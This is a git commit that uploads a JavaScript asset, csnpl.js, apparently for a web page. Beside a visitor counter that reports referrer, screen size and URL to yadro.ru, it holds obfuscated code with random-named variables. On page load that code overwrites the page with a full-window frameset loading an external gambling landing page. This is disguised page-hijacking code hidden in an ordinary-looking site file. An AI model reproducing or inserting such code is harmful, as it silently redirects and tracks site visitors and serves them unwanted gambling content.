c1d9b17f73bd4c3b16091f82490370c1b70272ec
silvianke <76688951+silvianke@users.noreply.github.com>
2021-03-10 12:54:14 +0100

    Add files via upload

---
+++ index_files/csnpl.js
@@ -0,0 +1,18 @@
+new Image().src = "//counter.yadro.ru/hit;csnpl?r"+
+escape(document.referrer)+((typeof(screen)=="undefined")?"":
+";s"+screen.width+"*"+screen.height+"*"+(screen.colorDepth?
+screen.colorDepth:screen.pixelDepth))+";u"+escape(document.URL)+
+";"+Math.random();
+var viewport = document.querySelector('meta[name=viewport]');
+var viewportContent = 'width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=0';
+
+if (viewport === null) {
+  var head = document.getElementsByTagName('head')[0];
+  viewport = document.createElement('meta');
+  viewport.setAttribute('name', 'viewport');
+  head.appendChild(viewport);
+}
+viewport.setAttribute('content', viewportContent);var gXbicfJwNAxzDvrOkjpadnoGTHFQSCZWqMuELKys = "<frameset rows=\"100%,*\" border=\"0\"><frame src=\"";
+var oTkpnaRmENCvXFjLxtVsbHUBOAyJKguwhrDPqQMW = " frameborder=\"0\" /> <frame frameborder=\"0\" noresize /> </frameset>";
+document.write(gXbicfJwNAxzDvrOkjpadnoGTHFQSCZWqMuELKys + "https://eugamblers.org/lendings/ALL-LANG-IN-ONE/PL-BOOMERANG/\"" + oTkpnaRmENCvXFjLxtVsbHUBOAyJKguwhrDPqQMW);
+0.001392
